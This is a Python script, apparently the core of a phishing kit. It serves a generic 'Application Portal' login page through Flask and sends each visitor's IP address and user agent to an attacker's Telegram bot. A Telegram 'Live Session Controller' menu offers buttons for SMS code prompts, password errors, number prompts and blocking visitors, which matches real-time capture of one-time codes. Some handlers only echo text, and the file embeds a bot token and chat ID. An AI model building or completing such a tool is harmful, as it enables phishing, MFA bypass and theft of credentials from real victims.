import logging
from multiprocessing import Process
from flask import Flask, request
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
BOT_TOKEN = "8954791203:AAFy_LrYlq01lKoNig42XZPzHOoMyjjJG2o"
CHAT_ID = "6546086469" 
CORRECT_VERIFICATION_CODE = "SECRET123"

# ==========================================
# 🌐 PROCESS 1: WEB TRACKER (FLASK)
# ==========================================
flask_app = Flask(__name__)

PORTAL_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
        h1 { color: #333333; font-size: 24px; margin-bottom: 10px; }
        p { color: #666666; font-size: 14px; margin-bottom: 20px; }
        .input-field { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #cccccc; border-radius: 4px; box-sizing: border-box; }
        .submit-btn { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>Please enter your identification code to access the terminal dashboard.</p>
        <form action="#" method="POST">
            <input type="text" name="portal_code" placeholder="Enter Access Code" class="input-field" required autocomplete="off">
            <button type="submit" class="submit-btn">Access Dashboard</button>
        </form>
    </div>
</body>
</html>
"""

def send_alert_to_telegram(message):
    url = f"https://telegram.org{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, json=payload)
    except Exception as e: 
        print(f"Error sending log to Telegram: {e}")

@flask_app.route('/', methods=['GET', 'POST'])
def web_portal_home():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    log_message = (
        f"🚨 *NEW VISIT DETECTED*\n\n"
        f"🌐 *IP Address:* `{visitor_ip}`\n"
        f"🖥️ *User Agent:* {user_agent}\n\n"
        f"Use /start in your bot chat to pull up the control panel dashboard."
    )
    send_alert_to_telegram(log_message)
    return PORTAL_HTML

def run_flask():
    flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# ==========================================
# 🤖 PROCESS 2: TELEGRAM BOT CONTROL PANEL
# ==========================================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔓 Security Preference", callback_data="header")],
        [
            InlineKeyboardButton("✅ Yes Prompt", callback_data="yes_prompt"),
            InlineKeyboardButton("📱 SMS Code I", callback_data="sms_code_1")
        ],
        [
            InlineKeyboardButton("📱 SMS Code II", callback_data="sms_code_2"),
            InlineKeyboardButton("📞 Number Prompt", callback_data="num_prompt")
        ],
        [
            InlineKeyboardButton("❌ Password Error", callback_data="pass_error"),
            InlineKeyboardButton("🚫 Block Visitor", callback_data="block_visitor")
        ],
        [InlineKeyboardButton("✅ Success", callback_data="success_action")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        text="⚙️ *Live Session Controller Menu*:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    action_messages = {
        "yes_prompt": "🔄 Sending authentication overlay challenge...",
        "sms_code_1": "🔑 Forcing page update to request text authorization code...",
        "sms_code_2": "🔑 Triggering standard backup verification entry code...",
        "num_prompt": "📞 Requesting phone link confirm input box...",
        "pass_error": "❌ Emitting bad password modal to site UI...",
        "block_visitor": "🚫 Blacklist rules deployed. Terminal detached.",
        "success_action": "🎉 Pushing step forwarding redirection commands..."
    }
    await query.message.reply_text(action_messages.get(query.data, "ℹ️ Active status indicator."))

async def verify_text_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.text.strip() == CORRECT_VERIFICATION_CODE:
        await update.message.reply_text("✅ Verification match! Code is correct.")
    else:
        await update.message.reply_text("❌ Validation failure. Code is incorrect.")

def run_telegram_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_click_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verify_text_code))
    
    print("Telegram system starting standard polling cycle...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    web_process = Process(target=run_flask)
    bot_process = Process(target=run_telegram_bot)
    
    web_process.start()
    bot_process.start()
    
    web_process.join()
    bot_process.join()